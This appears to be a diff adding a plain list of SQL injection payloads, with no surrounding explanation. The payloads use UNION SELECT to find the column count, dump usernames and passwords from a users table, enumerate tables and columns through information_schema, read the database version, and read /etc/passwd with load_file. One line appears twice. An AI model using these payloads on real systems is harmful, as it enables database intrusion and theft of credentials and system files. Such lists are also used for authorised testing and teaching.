@@ -1,0 +1,10 @@
+1' UNION SELECT null--
+1' UNION SELECT null, null, null--   -- For 3 columns
+1' UNION SELECT username, password, null FROM users--
+1' UNION SELECT null, null, null--   -- For 3 columns
+1' UNION SELECT null, null, table_name FROM information_schema.tables--
+1' UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name='users'--
+1' UNION SELECT null, null, version()--
+1' UNION SELECT null, null, load_file('/etc/passwd')--  -- (For file inclusion in some systems)
+
+
